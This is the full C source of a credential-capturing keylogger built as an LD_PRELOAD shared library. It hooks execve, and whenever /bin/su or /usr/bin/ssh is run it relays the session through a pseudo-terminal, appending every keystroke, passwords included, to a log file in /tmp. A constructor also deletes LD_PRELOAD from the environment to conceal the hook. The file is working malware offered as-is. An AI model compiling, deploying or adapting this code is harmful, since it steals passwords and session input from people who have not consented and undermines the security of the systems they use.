/*      This program is free software; you can redistribute it and/or modify
 *      it under the terms of the GNU General Public License as published by
 *      the Free Software Foundation; either version 3 of the License, or
 *      (at your option) any later version.
 *      
 *      This program is distributed in the hope that it will be useful,
 *      but WITHOUT ANY WARRANTY; without even the implied warranty of
 *      MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *      GNU General Public License for more details.
 *      
 *      You should have received a copy of the GNU General Public License
 *      along with this program; if not, write to the Free Software
 *      Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 *      MA 02110-1301, USA.
 *      
 *      Author: Matias Fontanini   
 */

#define _XOPEN_SOURCE 600 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <fcntl.h> 
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/select.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#define __USE_BSD 
#include <termios.h>

/* Redefine OUTPUT_FILE to whatever path you want your log to be saved. */
#ifndef OUTPUT_FILE
    #define OUTPUT_FILE "/tmp/output"
#endif
#define RTLD_NEXT	((void *) -1l)

typedef int (*execve_fun)(const char *filename, char *const argv[], char *const envp[]);
void __attribute__ ((constructor)) init(void);

extern char **environ;
/* The real execve pointer. */
execve_fun execve_ptr = 0;
/* Our file descriptor. */
int file = -1;
/* The read buffer. */
char buffer[256];
/* Array containing the files we want to monitor(ended with a null pointer). */
char *injected_files[] = { "/bin/su", "/usr/bin/ssh", 0 };

int do_read_write(int read_fd, int write_fd, int log) {
    int bread, i, start, dummy;
    do {
        /* Read a chunk of data from the provided descriptor. */
        if((bread = read(read_fd, buffer, sizeof(buffer))) <= 0)
            return 0;
        /* Should we log this read? */
        if(log && file != -1) {
            i = 0;
            start = 0;
            /* Loop through the data. If we find any \r character, 
             * we will write it to out log file and also write a 
             * \n afterwards. */
            while(i < bread) {
                while(i < bread && buffer[i] != '\r')
                    i++;
                if(i < bread)
                    i++;
                dummy = write(file, buffer + start, i - start);
                if(i < bread || (start < bread && buffer[bread-1] == '\r'))
                    dummy = write(file, "\n", 1);
                start = i;
            }
        }
        /* Finally, write it to write_fd. */
        if(write(write_fd, buffer, bread) <= 0)
            return 0;
    /* Keep looping while "read" fills our buffer. */
    } while(bread == sizeof(buffer));
    return 1;
}

void do_select(int descriptor) {
    fd_set fds;
    while(1) {
        /* Initialize the fd_set and add stdin and the 
         * master fd to it. */
        FD_ZERO(&fds);
        FD_SET(0, &fds);
        FD_SET(descriptor, &fds);
        /* Wait for data... */
        if(select(descriptor + 1, &fds, 0, 0, 0) == -1)
            return;
        /* If stdin has data, we will read from it and write 
         * on the master fd. */
        if(FD_ISSET(0, &fds)) {
            if(!do_read_write(0, descriptor, 1))
                return;
        }
        /* If the master fd has data, we will read from it 
         * and write it to stdout. */
        if(FD_ISSET(descriptor, &fds)) {
            if(!do_read_write(descriptor, 1, 0))
                return;
        }
    }
}

int execve(const char *filename, char *const argv[], char *const envp[]) {
    pid_t pid;
    struct winsize wsize;
    int master_fd, inject = 0;
    char **files_ptr;
    /* Lookup the real execve address. */
    if(!execve_ptr) 
        execve_ptr = (execve_fun)dlsym(RTLD_NEXT, "execve");
    /* Check if filename is one of the files in which we have to
     * keylog. */
    for(files_ptr = injected_files; *files_ptr; files_ptr++)  {
        if(!strcmp(*files_ptr, filename))
            inject = 1;
    }
    /* It's not one of the files, just normally call execve. */
    if(!inject)
        return execve_ptr(filename, argv, envp);

    /* Get the TTY window size. */
    ioctl(0, TIOCGWINSZ, &wsize);
    /* Open a pty master fd. */
    if((master_fd = posix_openpt(O_RDWR | O_NOCTTY)) == -1)
        return -1;
    if(grantpt(master_fd) == -1 || unlockpt(master_fd) == -1)
        return -1;
    
    if ((pid = fork()) == -1)   {
        return -1;
    }
    else if (pid == 0) {
        int slave_fd;
        /* We are the child process. Create a new session and open
         * the pty slave fd. */
        setsid();
        slave_fd = open(ptsname(master_fd), O_RDWR);
        /* We don't need master_fd anymore. */
        close(master_fd);
        
        /* Make our tty a controlling tty. */
        ioctl(slave_fd, TIOCSCTTY, 0);
        /* Set the master's window size. */
        ioctl(slave_fd, TIOCSWINSZ, &wsize);
        /* Use the slave descriptor in stdin, stdout and stderr. */
        if(dup2(slave_fd, 0) == -1 || dup2(slave_fd, 1) == -1 || dup2(slave_fd, 2) == -1)
            exit(1);
        /* We don't need slave_fd anymore. */
        close(slave_fd);

        /* Now call the real execve. */
        execve_ptr(filename, argv, envp);
        exit(0);
    }
    else {
        int status;
        struct termios original, settings; 
        
        /* Get the terminal settings. */
        tcgetattr(0, &original);

        settings = original;
        /* We don't want echoes in our master fd. */
        cfmakeraw (&settings);
        tcsetattr (0, TCSANOW, &settings); 
        
        /* Stop being a controlling tty. */
        ioctl(master_fd, TIOCSCTTY);
        /* Open our log file. */
        file = open(OUTPUT_FILE, O_WRONLY | O_APPEND | O_CREAT, 0644);
        /* Do reading and writing from the master descriptor. */
        do_select(master_fd);
        /* Close descriptors. */
        close(file);
        
        close(master_fd);
        /* Wait for the child process. */
        waitpid(pid, &status, 0);
        /* Restore the original terminal settings. */
        tcsetattr (0, TCSANOW, &original); 
        exit(0);
    }
}

void init(void) {
    char **env = environ;
    while(*env) {
        if(strstr(*env, "LD_PRELOAD=") == *env) {
            break;
        }
        env++;
    }
    while(*env) {
        *env = *(env + 1);
        env++;
    }
}
